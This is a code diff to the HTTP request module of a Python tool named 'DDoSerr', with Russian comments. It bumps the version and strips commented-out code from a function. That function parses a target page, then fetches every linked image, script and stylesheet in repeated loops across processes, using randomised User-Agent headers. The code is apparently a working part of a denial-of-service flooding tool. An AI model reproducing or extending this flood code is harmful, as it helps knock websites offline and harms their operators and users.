@@ -60,7 +60,7 @@ DDoSerr Copyright © 2018 Константин Панков
 
 """
 Модуль отправки HTTP-запросов для DDoSerr.
-v.1.6.2.13b. от 23.08.2018.
+v.1.6.2.14b. от 23.08.2018.
 """
 
 """
@@ -100,10 +100,9 @@ def http_connection(repeat, pause, url):
     Подгружает контент со страницы (картинки, java-скрипты, CSS стили).
     """
     
-    #!Вызов парсера странцы и получение списка ссылок 
+    #Вызов парсера странцы и получение списка ссылок 
     #на подгружаемый контент.
     content_urls = html_parser.obj_search(url)
-    #Возможно, надо будет засунуть в цикл. Или нет.
     
 
     #Цикл выполняет задание 'repeat' раз в каждом процессе.
@@ -123,86 +122,40 @@ def http_connection(repeat, pause, url):
         """
         
         """
-        !~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+        !~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
         Сделать цикл для запросов. - Выполнено.
         Добавить выбор рандомного юзер агента. - Выполнено.
         Заставить работать сессию с юзер агенторм - Переделать headers. - Выполнено.
+        
         !Сделать модуль для обхода страниц с задержками!
-        !~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+        !~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
         """
         
-        #!~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-        #!Запрос контента со страницы по найденным ссылкам.
+        #Запрос контента со страницы по найденным ссылкам.
 
         for _ in range(len(content_urls)):
             #Система прохода по списку ссылок на контент для его подгрузки.
             #И всё это должно подгружаться сразу, для каждой сессии,
             #поэтому нужен отдельный цикл внутри задания.
             
-            #Контент подгружается по одному элементу, 
-            #долго на слабой машине.
-            
             #_ или item.
             current_url = content_urls[_]
             
-            #Создаём новую сессию для каждого запроса - работает, но очень медленно (что не удивительно)! :)
-            ##session = requests.Session()
-            
             #Содаём подготовленный запрос с юзер агентом.
-            
-            ##content_on_page = session.get(current_url, headers={random_agent}, verify=False)
-            
-            
-            ###headers = {random_agent}
             
             req = requests.Request('GET', current_url, \
             headers={'User-Agent': random_agent})
             
             prepped = session.prepare_request(req)
             
-            ##prepped.headers['User-Agent'] = random_agent
-            
             content_on_page = session.send(prepped)
             
             
-            """
-            request = Request('GET', current_url, data=data, \
-            headers=headers)
-            
-            prepped = session.prepare_request(request)
-            
-            prepped.headers['User-Agent'] = random_agent
-            
-            content_on_page = session.send(prepped,
-                            stream=stream,
-                            verify=verify,
-                            proxies=proxies,
-                            cert=cert,
-                            timeout=timeout
-            )
-            """
-            
-            """
-            #Не так надо.
-            ##!!!С юзер агентом. Пока не работает совсем.
-            headers = {random_agent}
-            content_on_page = session.get(current_url, headers=headers)
-            """
             #---
             #Без юзер агента.
             ##content_on_page = session.get(current_url)
             #---
             
-        #~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-        
-            """
-            #Не актуально.
-            #Для main_page.
-            #Код возврата.
-            #status = str(main_page.status_code)
-            #Размер ответа, большой ответ разбивается на куски по 8196 Байт.
-            #size = str(sum(len(chunk) for chunk in main_page.iter_content(8196)))
-            """
             
             #Получение информации по контенту.
             
